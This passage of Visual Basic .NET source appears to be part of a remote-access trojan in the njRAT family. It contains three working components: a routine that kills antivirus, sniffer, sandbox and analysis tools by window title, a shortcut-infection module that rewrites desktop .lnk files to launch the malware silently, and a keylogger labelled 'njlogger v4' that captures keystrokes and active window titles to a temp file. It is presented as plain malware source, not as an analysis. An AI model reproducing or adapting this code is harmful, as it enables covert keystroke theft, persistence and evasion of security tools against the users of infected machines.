            For Each Najaf33 As Process In Security33
                Najaf33.Kill()
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("ApateDNS") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("Malwarebytes Anti-Malware") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("TCPEye") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("SmartSniff") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("Active Ports") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("ProcessEye") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("MKN TaskExplorer") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("CurrPorts") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("System Explorer") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("DiamondCS Port Explorer") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("VirusTotal") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("Metascan Online") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("Speed Gear") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.ProcessName.Contains("The Wireshark Network Analyzer") Then
                    proc.Kill()

                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("Sandboxie Control") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("ApateDNS") Then
                    proc.Kill()
                End If
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains(".NET Reflector") Then
                    proc.Kill()
                End If
            Next
            Resume bypass
        End If
    End Sub
End Module
Module SortCut_Install
    Public Sub ShortcutInfection()
        On Error Resume Next
        If RegValueGet("Black") = "True" Then
            Exit Sub
        Else
            RegValueSet("Black", "True")
        End If
        Dim DeskTop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\"
        Dim file = IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
        Dim virustarget = Application.ExecutablePath.ToString
        For Each mw In file
            Dim lnk = IO.Path.GetExtension(mw)
            Dim name = IO.Path.GetFileNameWithoutExtension(mw)
            Dim lnkPath = IO.Path.GetFullPath(mw)
            If lnk = ".lnk" Then
                Dim namelnk = System.IO.Path.GetFileName(lnkPath)
                Dim WSH = CreateObject("WScript.Shell")
                Dim ExeLink = WSH.CreateShortcut(lnkPath)
                With CreateObject("WScript.Shell").CreateShortcut(DeskTop & namelnk)
                    .TargetPath = "cmd.exe"
                    .WorkingDirectory = ""
                    .Arguments = "/c start " & virustarget & "&explorer /root,""" & ExeLink.TargetPath.ToString & """ & exit"
                    .IconLocation = ExeLink.TargetPath.ToString
                    IO.File.Delete(lnkPath)
                    .Save()
                End With
            End If
        Next
    End Sub
    Public comp As Object = New Microsoft.VisualBasic.Devices.Computer
    Function RegValueGet(ByVal name As String) As String
        Try
            Return comp.Registry.CurrentUser.CreateSubKey("Software\" & "ShortCutInfection").GetValue(name, "")
        Catch ex As Exception
            Return "error < Not Found >"
        End Try
    End Function
    Function RegValueSet(ByVal name As String, ByVal values As String)
        Try
            comp.Registry.CurrentUser.CreateSubKey("Software\" & "ShortCutInfection").SetValue(name, values)
        Catch ex As Exception
        End Try
        Return Nothing
    End Function
End Module
Public Class kl
    ' njlogger v4
#Region "API"
    <DllImport("user32.dll")> _
    Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, _
  ByVal dwhkl As IntPtr) As Integer
    End Function
    <DllImport("user32.dll")> _
    Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
    End Function
    <DllImport("user32.dll")> _
    Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
    End Function
    Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Private Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Integer) As Integer
    Private Declare Function GetForegroundWindow Lib "user32" () As IntPtr
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
#End Region
    Private LastAV As Integer ' Last Active Window Handle
    Private LastAS As String ' Last Active Window Title
    Private lastKey As Keys = Nothing ' Last Pressed Key

    Private Function AV() As String ' Get Active Window
        Try
            Dim o = GetForegroundWindow
            Dim id As Integer
            GetWindowThreadProcessId(o, id)
            Dim p As Object = Process.GetProcessById(id)
            If o.ToInt32 = LastAV And LastAS = p.MainWindowTitle Or p.MainWindowTitle.Length = 0 Then
            Else

                LastAV = o.ToInt32
                LastAS = p.MainWindowTitle
                Return vbNewLine & "[ " & HM() & " " & p.ProcessName & " " & LastAS & " ]" & vbNewLine
            End If
        Catch ex As Exception
        End Try
        Return ""
    End Function
    Public Clock As New Microsoft.VisualBasic.Devices.Clock
    Private Function HM() As String
        Try
            Return Clock.LocalTime.ToString("yy/MM/dd")
        Catch ex As Exception
            Return "??/??/??"
        End Try
    End Function
    Public Logs As String = ""
    Dim keyboard As Object = New Microsoft.VisualBasic.Devices.Keyboard
    Private Shared Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
        Try
            Dim sbString As New System.Text.StringBuilder()
            Dim bKeyState As Byte() = New Byte(254) {}
            Dim bKeyStateStatus As Boolean = GetKeyboardState(bKeyState)
            If Not bKeyStateStatus Then
                Return ""
            End If
            Dim lScanCode As UInteger = MapVirtualKey(VKCode, 0)
            Dim h As IntPtr = GetForegroundWindow()
            Dim id As Integer = 0
            Dim Aid As Integer = GetWindowThreadProcessId(h, id)
            Dim HKL As IntPtr = GetKeyboardLayout(Aid)
            ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0), _
             HKL)
            Return sbString.ToString()
        Catch ex As Exception
        End Try
        Return CType(VKCode, Keys).ToString
    End Function
    Private Function Fix(ByVal k As Keys) As String
        Dim isuper As Boolean = keyboard.ShiftKeyDown
        If keyboard.CapsLock = True Then
            If isuper = True Then
                isuper = False
            Else
                isuper = True
            End If
        End If
        Try
            Select Case k
                Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back
                    Return "[" & k.ToString & "]"
                Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt
                    Return ""
                Case Keys.Space
                    Return " "
                Case Keys.Enter, Keys.Return
                    If Logs.EndsWith("[ENTER]" & vbNewLine) Then
                        Return ""
                    End If
                    Return "[ENTER]" & vbNewLine
                Case Keys.Tab
                    Return "[TAP]" & vbNewLine
                Case Else
                    If isuper = True Then
                        Return VKCodeToUnicode(k).ToUpper
                    Else
                        Return VKCodeToUnicode(k)
                    End If
            End Select
        Catch ex As Exception
            If isuper = True Then
                Return ChrW(k).ToString.ToUpper
            Else
                Return ChrW(k).ToString.ToLower
            End If
        End Try
    End Function
    Public s As String = New IO.FileInfo(Application.ExecutablePath).Name
    Public LogsPath As String = IO.Path.GetTempPath & "\" & s & ".tmp"
    Public Sub WRK()

        Try
            Logs = IO.File.ReadAllText(LogsPath)

        Catch ex As Exception
        End Try

        Try
            Dim lp As Integer = 0
            While True
                lp += 1
                For i As Integer = 0 To 255
                    If GetAsyncKeyState(i) = -32767 Then
                        Dim k As Keys = i
                        Dim s = Fix(k)
                        If s.Length > 0 Then
                            Logs &= AV()
                            Logs &= s
                        End If
                        lastKey = k
                    End If
                Next
                If lp = 1000 Then
                    lp = 0
                    Dim mx As Integer = 20 * 1024
                    If Logs.Length > mx Then
                        Logs = Logs.Remove(0, Logs.Length - mx)
                    End If
                    IO.File.WriteAllText(LogsPath, Logs)
                End If
                Threading.Thread.CurrentThread.Sleep(1)

            End While
        Catch ex As Exception

        End Try
    End Sub
End Class